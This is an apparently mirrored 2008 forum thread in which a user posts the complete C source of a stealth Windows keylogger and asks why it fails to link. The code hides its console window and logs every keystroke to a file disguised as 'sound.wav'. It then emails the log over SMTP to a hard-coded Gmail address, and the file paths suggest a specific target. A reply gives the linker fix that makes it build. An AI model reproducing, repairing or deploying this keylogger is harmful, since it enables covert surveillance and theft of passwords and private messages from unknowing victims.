<!DOCTYPE html>
<html lang="en-US">
  
<!-- Mirrored from forum.moparisthebest.com/t/c-c-problem/202399 by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 05 Aug 2019 15:38:33 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>C/C++ Problem - General Programming - moparisthebest.com</title>
    <meta name="description" content="Hi, I found this program on the internet but when I compile it with Dev C++ 4.9.9.2 I get these errors in the compile box: 

 Compiler: Default compiler
Executing  g++.exe...
g++.exe &amp;quot;\\.PSF\.Home\Desktop\Folder Lock(for&amp;hellip;">
    <meta name="generator" content="Discourse 2.3.2 - https://github.com/discourse/discourse version c587df7e2a03c2962f4c8cefd6f03969bb87d525">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/1/1f0dc167bcf798bdbd70b03bf0fd1bc836e54e1a_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/4/41fecb6185fddc2758aeba68c3f8c9c78e26e4ff_2_180x180.png">
<meta name="theme-color" content="#0088cc">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="202399.html" />
<script type="application/ld+json">{"@context":"http://schema.org","@type":"WebSite","url":"https://forum.moparisthebest.com","potentialAction":{"@type":"SearchAction","target":"https://forum.moparisthebest.com/search?q={search_term_string}","query-input":"required name=search_term_string"}}</script>
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="moparisthebest.com Search">

      <link href="../../stylesheets/desktop_1_ec9f75e3d0b2a904642ce53663991837b70cda3334fc.css?__ws=forum.moparisthebest.com" media="all" rel="stylesheet" data-target="desktop" data-theme-id="2"/>
      <link href="../../stylesheets/desktop_theme_2_6707e7ee46ac9f2f0510c29ddd10e8f6ce21c1ae34fc.css?__ws=forum.moparisthebest.com" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="2"/>
    
    
      <link rel="alternate" type="application/rss+xml" title="RSS feed of &#39;C/C++ Problem&#39;" href="202399.rss" />
  <meta property="og:site_name" content="moparisthebest.com" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://forum.moparisthebest.com/uploads/default/original/2X/4/41fecb6185fddc2758aeba68c3f8c9c78e26e4ff.png" />
<meta property="og:image" content="https://forum.moparisthebest.com/uploads/default/original/2X/4/41fecb6185fddc2758aeba68c3f8c9c78e26e4ff.png" />
<meta property="og:url" content="https://forum.moparisthebest.com/t/c-c-problem/202399" />
<meta name="twitter:url" content="https://forum.moparisthebest.com/t/c-c-problem/202399" />
<meta property="og:title" content="C/C++ Problem" />
<meta name="twitter:title" content="C/C++ Problem" />
<meta property="og:description" content="Hi, I found this program on the internet but when I compile it with Dev C++ 4.9.9.2 I get these errors in the compile box:  [code]Compiler: Default compiler  Executing  g++.exe…  g++.exe “\.PSF.Home\Desktop\Folder Lock(for Sen)\Keylogger-1.cpp” -o “\.PSF.Home\Desktop\Folder Lock(for Sen)\Keylogger-1.exe”    -I&quot;C:\Dev-Cpp\lib\gcc\mingw32\3.4.2\include&quot;  -I&quot;C:\Dev-Cpp\include\c++\3.4.2\backward&quot;  -I&quot;C:\Dev-Cpp\include\c++\3.4.2\mingw32&quot;  -I&quot;C:\Dev-Cpp\include\c++\3.4.2&quot;  -I&quot;C:\Dev-Cpp\include&quot;   -..." />
<meta name="twitter:description" content="Hi, I found this program on the internet but when I compile it with Dev C++ 4.9.9.2 I get these errors in the compile box:  [code]Compiler: Default compiler  Executing  g++.exe…  g++.exe “\.PSF.Home\Desktop\Folder Lock(for Sen)\Keylogger-1.cpp” -o “\.PSF.Home\Desktop\Folder Lock(for Sen)\Keylogger-1.exe”    -I&quot;C:\Dev-Cpp\lib\gcc\mingw32\3.4.2\include&quot;  -I&quot;C:\Dev-Cpp\include\c++\3.4.2\backward&quot;  -I&quot;C:\Dev-Cpp\include\c++\3.4.2\mingw32&quot;  -I&quot;C:\Dev-Cpp\include\c++\3.4.2&quot;  -I&quot;C:\Dev-Cpp\include&quot;   -..." />
<meta property="article:published_time" content="2008-04-28T20:50:29+00:00" />
<meta property="og:ignore_canonical" content="true" />



    
  </head>
  <body class="crawler">
    
    <header>
      <a href="../../index.html">
          <img src="../../uploads/default/original/2X/3/37bba8fb3bd06c372ab54fa72ec38bf9f8f40b37.gif" alt="moparisthebest.com" id="site-logo" style="max-width: 150px;">
      </a>
    </header>
    <div id="main-outlet" class="wrap">
      <h1 class="crawler-topic-title">
  <a href="202399.html">C/C++ Problem</a>
</h1>

<div id='breadcrumbs'>
    <div id="breadcrumb-0" itemscope itemtype="http://data-vocabulary.org/Breadcrumb"
>
      <a href="../../c/general-programming.html" itemprop="url" class='badge-wrapper bullet'>
        <span class="badge-category-bg"></span>
        <span itemprop="title" class='category-title'>General Programming</span>
      </a>
    </div>
</div>





  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/Jellybean732.html'><span itemprop='name'>Jellybean732</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-04-28T20:50:29Z'>
            <time itemprop='dateModified' datetime='2016-07-30T22:12:07Z' class='post-time'>
              July 30, 2016, 10:12pm
            </time>
        <span itemprop='position'>#1</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>Hi, I found this program on the internet but when I compile it with Dev C++ 4.9.9.2 I get these errors in the compile box:</p>
<p>[code]Compiler: Default compiler<br>
Executing  g++.exe…<br>
g++.exe “\.PSF.Home\Desktop\Folder Lock(for Sen)\Keylogger-1.cpp” -o “\.PSF.Home\Desktop\Folder Lock(for Sen)\Keylogger-1.exe”    -I"C:\Dev-Cpp\lib\gcc\mingw32\3.4.2\include"  -I"C:\Dev-Cpp\include\c++\3.4.2\backward"  -I"C:\Dev-Cpp\include\c++\3.4.2\mingw32"  -I"C:\Dev-Cpp\include\c++\3.4.2"  -I"C:\Dev-Cpp\include"   -L"C:\Dev-Cpp\lib"<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x733):Keylogger-1.cpp: undefined reference to <code>WSAStartup@8' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x756):Keylogger-1.cpp: undefined reference to</code>WSACleanup@0’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x770):Keylogger-1.cpp: undefined reference to <code>gethostbyname@4' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x803):Keylogger-1.cpp: undefined reference to</code>htons@4’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x829):Keylogger-1.cpp: undefined reference to <code>socket@12' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x862):Keylogger-1.cpp: undefined reference to</code>connect@12’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x8b6):Keylogger-1.cpp: undefined reference to <code>recv@16' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x943):Keylogger-1.cpp: undefined reference to</code>send@16’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0x980):Keylogger-1.cpp: undefined reference to <code>recv@16' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xa4f):Keylogger-1.cpp: undefined reference to</code>send@16’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xa8c):Keylogger-1.cpp: undefined reference to <code>recv@16' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xb5b):Keylogger-1.cpp: undefined reference to</code>send@16’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xb98):Keylogger-1.cpp: undefined reference to <code>recv@16' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xc25):Keylogger-1.cpp: undefined reference to</code>send@16’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xc62):Keylogger-1.cpp: undefined reference to <code>recv@16' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xdd6):Keylogger-1.cpp: undefined reference to</code>send@16’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xe13):Keylogger-1.cpp: undefined reference to <code>recv@16' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xea0):Keylogger-1.cpp: undefined reference to</code>send@16’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xedd):Keylogger-1.cpp: undefined reference to <code>recv@16' C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xf26):Keylogger-1.cpp: undefined reference to</code>closesocket@4’<br>
C:\Users\ADMINI~1\AppData\Local\Temp/cc8idaaa.o(.text+0xf2e):Keylogger-1.cpp: undefined reference to `WSACleanup@0’<br>
collect2: ld returned 1 exit status</p>
<p>Execution terminated[/code]</p>
<p>Any ideas? The actual code that I am using is:</p>
<p>[code]/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *</p>
<ul>
<li>
<pre><code>                                                                         *
</code></pre>
</li>
<li>File: keymail.c   Ver. 0.7                                                  *</li>
<li>
<pre><code>                                                                         *
</code></pre>
</li>
<li>Purpose: a stealth (somewhat) key logger, writes to a log file then sends   *</li>
<li>and email to whoever is set in the <span class="hashtag">#define</span> options at compile time.         *</li>
<li>This code is for educational uses, don’t be an ass hat with it.             *</li>
<li>White Scorpion (www.white-scorpion.nl) did the initial work on the key      *</li>
<li>logger, but he has gone on to bigger and better things.                     *</li>
<li>This version was crafted by Irongeek (<a href="http://www.irongeek.com/" rel="nofollow noopener">www.Irongeek.com</a>), who tacked on      *</li>
<li>some code to make it send emails, along with a few other changes.           *</li>
<li>If some of the code is crappy, blame Irongeek and not White Scorpion.       *</li>
<li>Please send Irongeek improvements and he will post the changes and give you *</li>
<li>credit for your contributions.                                              *</li>
<li>
<pre><code>                                                                         *
</code></pre>
</li>
<li>This program is free software; you can redistribute it and/or               *</li>
<li>modify it under the terms of the GNU General Public License                 *</li>
<li>as published by the Free Software Foundation; either version 2              *</li>
<li>of the License, or (at your option) any later version.                      *</li>
<li>
<pre><code>                                                                         *
</code></pre>
</li>
<li>This program is distributed in the hope that it will be useful,             *</li>
<li>but WITHOUT ANY WARRANTY; without even the implied warranty of              *</li>
<li>MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the               *</li>
<li>GNU General Public License for more details.                                *</li>
<li>
<pre><code>                                                                         *
</code></pre>
</li>
<li>You should have received a copy of the GNU General Public License           *</li>
<li>along with this program; if not, write to the Free Software                 *</li>
<li>Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. *</li>
<li>
<pre><code>                                                                         *
</code></pre>
</li>
<li>Change log:                                                                  *</li>
<li>
<pre><code> 1/3/06 On Ed Rguyl's recommendation I changed how malloc was used.      *
</code></pre>
</li>
<li>
<pre><code> 6/22/06 Added the date and time functionality using ctime and fixed     *
</code></pre>
</li>
<li>
<pre><code>         a bug where subject was being defined twice.(ThVoidedLine)      *
</code></pre>
</li>
<li>
<pre><code>                                                                         *
</code></pre>
</li>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<ul>
<li>
<em>/<br>
/</em><br>
Compile notes: I used Dev-C++ 4.9.9.2 to compie this. if you get an error like:<br>
Linker error] undefined reference to `WSAStartup@8’<br>
Add this:<br>
-lws2_32<br>
to Tools-&gt;Compiler Options under the section on compile flags.<br>
*/</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><span class="hashtag">#include</span> &lt;windows.h&gt;<br>
<span class="hashtag">#include</span> &lt;stdio.h&gt;<br>
<span class="hashtag">#include</span> &lt;winuser.h&gt;<br>
<span class="hashtag">#include</span> &lt;windowsx.h&gt;<br>
<span class="hashtag">#include</span> &lt;time.h&gt;<br>
int MailIt (char *mailserver, char *emailto, char *emailfrom,<br>
char *emailsubject, char *emailmessage);<br>
<span class="hashtag">#define</span> BUFSIZE 800<br>
<span class="hashtag">#define</span> waittime 500<br>
/*If you don’t know the mail exchange server for an address for the following<br>
“nslookup -querytype=mx <a href="http://gmail.com/" rel="nofollow noopener">gmail.com</a>” but replace <a href="http://gmail.com/" rel="nofollow noopener">gmail.com</a> with the domain for<br>
whatever email address you want. YOU MUST CHANGE  THESE SETTINGS OR<br>
IT WILL NOT WORK!!! */<br>
<span class="hashtag">#define</span> cmailserver “<a href="http://gmail-smtp-in.l.google.com/" rel="nofollow noopener">gmail-smtp-in.l.google.com</a>”<br>
<span class="hashtag">#define</span> cemailto <a>"logsen10@gmail.com</a>"<br>
<span class="hashtag">#define</span> cemailfrom <a>"logsen10@gmail.com</a>"<br>
<span class="hashtag">#define</span> LogLength 100<br>
<span class="hashtag">#define</span> FileName “sound.wav”<br>
<span class="hashtag">#define</span> SMTPLog “ring.wav”<br>
<span class="hashtag">#define</span> cemailsubject “Logged”</p>
<p>int get_keys(void);<br>
int test_key(void);<br>
int main(void)<br>
{<br>
//Uncomment the lines below to put the keylogger in stealh mode.<br>
HWND stealth; /*creating stealth */<br>
AllocConsole();<br>
stealth=FindWindowA(“ConsoleWindowClass”,NULL);<br>
ShowWindow(stealth,0);</p>
<p>{FILE *file;<br>
file=fopen(FileName,“a+”);<br>
time_t theTime=time(0);<br>
fputs("\nStarted logging: ", file);<br>
fputs(ctime(&amp;theTime),file);<br>
fclose(file);<br>
}</p>
<p>/* if (test==2)<br>
{//the path in which the file needs to be<br>
char *path=“c:\%windir%\svchost.exe”;<br>
create=create_key(path);<br>
} */</p>
<p>int t=get_keys();<br>
return t;<br>
}</p>
<p>int get_keys(void)<br>
{<br>
int freadindex;<br>
char *buf;<br>
long len;<br>
FILE *file;<br>
file=fopen(FileName,“a+”);</p>
<pre><code>       short character;
         while(1)
         {
                Sleep(10);/*to prevent 100% cpu usage*/
                for(character=8;character&lt;=222;character++)
                {
                    if(GetAsyncKeyState(character)==-32767)
                    {  
                        FILE *file;
                        file=fopen(FileName,"a+");
                        if(file==NULL)
                        {
                                return 1;
                        }            
                        if(file!=NULL)
                        {        
                                if((character&gt;=39)&amp;&amp;(character&lt;=64))
                                {
                                      fputc(character,file);
                                      fclose(file);
                                      break;
                                }        
                                else if((character&gt;64)&amp;&amp;(character&lt;91))
                                {
                                      character+=32;
                                      fputc(character,file);
                                      fclose(file);
                                      break;
                                }
                                else
                                {
                                    switch(character)
                                    {
                                          case VK_SPACE:
                                          fputc(' ',file);
                                          fclose(file);
                                          break;    
                                          case VK_SHIFT:
                                          fputs("\r\n[SHIFT]\r\n",file);
                                          fclose(file);
                                          break;                                            
                                          case VK_RETURN:
                                          fputs("\r\n[ENTER]\r\n",file);
                                          fclose(file);
                                          break;
                                          case VK_BACK:
                                          fputs("\r\n[BACKSPACE]\r\n",file);
                                          fclose(file);
                                          break;
                                          case VK_TAB:
                                          fputs("\r\n[TAB]\r\n",file);
                                          fclose(file);
                                          break;
                                          case VK_CONTROL:
                                          fputs("\r\n[CTRL]\r\n",file);
                                          fclose(file);
                                          break;    
                                          case VK_DELETE:
                                          fputs("\r\n[DEL]\r\n",file);
                                          fclose(file);
                                          break;
                                          case VK_OEM_1:
                                          fputs("\r\n[;:]\r\n",file);
                                          fclose(file);
                                          break;
                                          case VK_OEM_2:
                                          fputs("\r\n[/?]\r\n",file);
                                          fclose(file);
                                          break;
                                          case VK_OEM_3:
                                          fputs("\r\n[`~]\r\n",file);
                                          fclose(file);
                                          break;
                                          case VK_OEM_4:
                                          fputs("\r\n[ [{ ]\r\n",file);
                                          fclose(file);
                                          break;
                                          case VK_OEM_5:
                                          fputs("\r\n[\\|]\r\n",file);
                                          fclose(file);
</code></pre>
<p>[/code]</p>
<p>Continued next post.</p>
      </div>

      <meta itemprop='headline' content='C/C++ Problem'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>

          <div class='crawler-linkback-list' itemscope itemtype='http://schema.org/ItemList'>
          </div>

  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/Jellybean732.html'><span itemprop='name'>Jellybean732</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-04-28T20:51:14Z'>
            <time itemprop='dateModified' datetime='2016-07-30T22:12:07Z' class='post-time'>
              July 30, 2016, 10:12pm
            </time>
        <span itemprop='position'>#2</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>[code]                                              break;<br>
case VK_OEM_6:<br>
fputs("\r\n[ ]} ]\r\n",file);<br>
fclose(file);<br>
break;<br>
case VK_OEM_7:<br>
fputs("\r\n[’"]\r\n",file);<br>
fclose(file);<br>
break;<br>
case 187:<br>
fputc(’+’,file);<br>
fclose(file);<br>
break;<br>
case 188:<br>
fputc(’,’,file);<br>
fclose(file);<br>
break;<br>
case 189:<br>
fputc(’-’,file);<br>
fclose(file);<br>
break;<br>
case 190:<br>
fputc(’.’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD0:<br>
fputc(‘0’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD1:<br>
fputc(‘1’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD2:<br>
fputc(‘2’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD3:<br>
fputc(‘3’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD4:<br>
fputc(‘4’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD5:<br>
fputc(‘5’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD6:<br>
fputc(‘6’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD7:<br>
fputc(‘7’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD8:<br>
fputc(‘8’,file);<br>
fclose(file);<br>
break;<br>
case VK_NUMPAD9:<br>
fputc(‘9’,file);<br>
fclose(file);<br>
break;<br>
case VK_CAPITAL:<br>
fputs("\r\n[CAPS LOCK]\r\n",file);<br>
fclose(file);<br>
break;<br>
default:<br>
fclose(file);<br>
break;<br>
}<br>
}<br>
}<br>
}<br>
}<br>
FILE *file;<br>
file=fopen(FileName,“rb”);<br>
fseek(file,0,SEEK_END); //go to end<br>
len=ftell(file); //get position at end (length)<br>
if(len&gt;=LogLength) {<br>
fseek(file,0,SEEK_SET);//go to beg.<br>
buf=(char *)malloc(len);//malloc buffer<br>
freadindex=fread(buf,1,len,file);//read into buffer<br>
buf[freadindex] = ‘\0’;//Extra bit I have to add to make it a sting<br>
MailIt( cmailserver, cemailto, cemailfrom, cemailsubject, buf);<br>
fclose(file);<br>
file=fopen(FileName,“w”);<br>
}</p>
<pre><code>        fclose(file);
        //free (buf);
             
       }
       return EXIT_SUCCESS;                            
</code></pre>
<p>}</p>
<p>int MailIt (char *mailserver, char *emailto, char *emailfrom,<br>
char *emailsubject, char *emailmessage) {<br>
SOCKET sockfd;<br>
WSADATA wsaData;<br>
FILE *smtpfile;</p>
<pre><code>#define bufsize 300
int bytes_sent;   /* Sock FD */
int err;
struct hostent *host;   /* info from gethostbyname */
struct sockaddr_in dest_addr;   /* Host Address */
char line[1000];
char *Rec_Buf = (char*) malloc(bufsize+1);
smtpfile=fopen(SMTPLog,"a+");
if (WSAStartup(0x202,&amp;wsaData) == SOCKET_ERROR) {
  fputs("WSAStartup failed",smtpfile);
  WSACleanup();
  return -1;
}
if ( (host=gethostbyname(mailserver)) == NULL) {
   perror("gethostbyname");
   exit(1);
}
memset(&amp;dest_addr,0,sizeof(dest_addr));
memcpy(&amp;(dest_addr.sin_addr),host-&gt;h_addr,host-&gt;h_length);

 /* Prepare dest_addr */
 dest_addr.sin_family= host-&gt;h_addrtype;  /* AF_INET from gethostbyname */
 dest_addr.sin_port= htons(25); /* PORT defined above */

 /* Get socket */

 if ((sockfd=socket(AF_INET,SOCK_STREAM,0)) &lt; 0) {
    perror("socket");
    exit(1);
    }
 /* Connect !*/
 fputs("Connecting....\n",smtpfile);

if (connect(sockfd, (struct sockaddr *)&amp;dest_addr,sizeof(dest_addr)) == -1){
    perror("connect");
    exit(1);
    }
 Sleep(waittime);
 err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
 fputs(Rec_Buf,smtpfile);
 strcpy(line,"helo me.somepalace.com\n");
 fputs(line,smtpfile);
 bytes_sent=send(sockfd,line,strlen(line),0);
 Sleep(waittime);
 err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
 fputs(Rec_Buf,smtpfile);
 strcpy(line,"MAIL FROM:&lt;");
 strncat(line,emailfrom,strlen(emailfrom));
 strncat(line,"&gt;\n",3);
 fputs(line,smtpfile);
 bytes_sent=send(sockfd,line,strlen(line),0);
 Sleep(waittime);
 err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
 fputs(Rec_Buf,smtpfile);
 strcpy(line,"RCPT TO:&lt;");
 strncat(line,emailto,strlen(emailto));
 strncat(line,"&gt;\n",3);
 fputs(line,smtpfile);
 bytes_sent=send(sockfd,line,strlen(line),0);
 Sleep(waittime);
 err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
 fputs(Rec_Buf,smtpfile);
 strcpy(line,"DATA\n");
 fputs(line,smtpfile);
 bytes_sent=send(sockfd,line,strlen(line),0);
 Sleep(waittime);
 err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
 fputs(Rec_Buf,smtpfile);
 Sleep(waittime);
 strcpy(line,"To:");
 strcat(line,emailto);
 strcat(line,"\n");
 strcat(line,"From:");
 strcat(line,emailfrom);
 strcat(line,"\n");
 strcat(line,"Subject:");
 strcat(line,emailsubject);
 strcat(line,"\n");
 strcat(line,emailmessage);
 strcat(line,"\r\n.\r\n");
 fputs(line,smtpfile);
 bytes_sent=send(sockfd,line,strlen(line),0);
 Sleep(waittime);
 err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
 fputs(Rec_Buf,smtpfile);
 strcpy(line,"quit\n");
 fputs(line,smtpfile);
 bytes_sent=send(sockfd,line,strlen(line),0);
 Sleep(waittime);
 err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
 fputs(Rec_Buf,smtpfile);
 fclose(smtpfile);                          
 #ifdef WIN32
 closesocket(sockfd);
 WSACleanup();
 #else
 close(sockfd);
 #endif
</code></pre>
<p>}[/code]</p>
<p>Please post if you can help me.</p>
<p>Thanks</p>
<p>Jellybean732</p>
      </div>

      <meta itemprop='headline' content='C/C++ Problem'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/T_76.html'><span itemprop='name'>T_76</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-04-28T23:45:28Z'>
            <time itemprop='dateModified' datetime='2016-07-30T22:12:10Z' class='post-time'>
              July 30, 2016, 10:12pm
            </time>
        <span itemprop='position'>#3</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>What are you using this for?</p>
      </div>

      <meta itemprop='headline' content='C/C++ Problem'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/I_Flame_Moparscapers.html'><span itemprop='name'>I_Flame_Moparscapers</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-04-29T00:01:20Z'>
            <time itemprop='dateModified' datetime='2016-07-30T22:12:10Z' class='post-time'>
              July 30, 2016, 10:12pm
            </time>
        <span itemprop='position'>#4</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p><span class="hashtag">#pragma</span> comment(lib, “wsock32.lib”)</p>
<p>also, horrible keylogger.</p>
      </div>

      <meta itemprop='headline' content='C/C++ Problem'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/Jellybean732.html'><span itemprop='name'>Jellybean732</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-04-29T00:14:02Z'>
            <time itemprop='dateModified' datetime='2016-07-30T22:12:11Z' class='post-time'>
              July 30, 2016, 10:12pm
            </time>
        <span itemprop='position'>#5</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>kk thnx</p>
      </div>

      <meta itemprop='headline' content='C/C++ Problem'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

       <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
          <meta itemprop="interactionType" content="http://schema.org/CommentAction"/>
          <meta itemprop="userInteractionCount" content="0" />
        </div>


  </div>
  <div itemscope itemtype='http://schema.org/DiscussionForumPosting' class='topic-body crawler-post'>
      <div class='crawler-post-meta'>
        <span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <a itemprop="url" href='../../u/zstars.html'><span itemprop='name'>zstars</span></a>
          
        </span>

        <span class="crawler-post-infos">
            <meta itemprop='datePublished' content='2008-04-29T13:32:49Z'>
            <time itemprop='dateModified' datetime='2016-07-30T22:12:46Z' class='post-time'>
              July 30, 2016, 10:12pm
            </time>
        <span itemprop='position'>#6</span>
        </span>
      </div>
      <div class='post' itemprop='articleBody'>
        <p>It’s C, not C++. And apart from being horrible, I don’t think it is even complete <img src="../../images/emoji/twitter/slight_smile1bce.png?v=6" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
      </div>

      <meta itemprop='headline' content='C/C++ Problem'>

      <div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
         <meta itemprop="interactionType" content="http://schema.org/LikeAction"/>
         <meta itemprop="userInteractionCount" content="0" />
         <span class='post-likes'></span>
       </div>

